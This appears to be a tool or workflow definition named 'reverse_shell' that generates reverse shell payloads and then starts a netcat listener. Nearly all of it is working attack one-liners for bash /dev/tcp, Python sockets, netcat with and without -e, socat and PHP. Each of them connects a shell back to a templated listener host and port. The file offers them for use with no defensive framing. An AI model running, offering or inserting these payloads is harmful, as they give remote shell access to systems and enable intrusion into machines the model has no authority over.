name: reverse_shell
description: Reverse shell listener setup: generate payloads for bash, python, netcat, and socat and start a listener.
author: james-linux

params.command: echo '=== REVERSE SHELL PAYLOADS ===' && echo '--- Your listener IP: {{lhost}} Port: {{lport}} ---' && echo '' && echo '[Bash]' && echo "bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1" && echo '' && echo '[Python]' && echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{lhost}}\",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" && echo '' && echo '[Netcat]' && echo "nc -e /bin/sh {{lhost}} {{lport}}" && echo '' && echo '[Netcat (no -e)]' && echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f" && echo '' && echo '[Socat]' && echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{{lhost}}:{{lport}}" && echo '' && echo '[PHP]' && echo "php -r '\$sock=fsockopen(\"{{lhost}}\",{{lport}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

steps.description: Generate reverse shell payloads for multiple languages

params.command: echo '[*] Starting netcat listener on port {{lport}}...' && echo '[*] Waiting for incoming connection...' && timeout 120 nc -nlvp {{lport}}
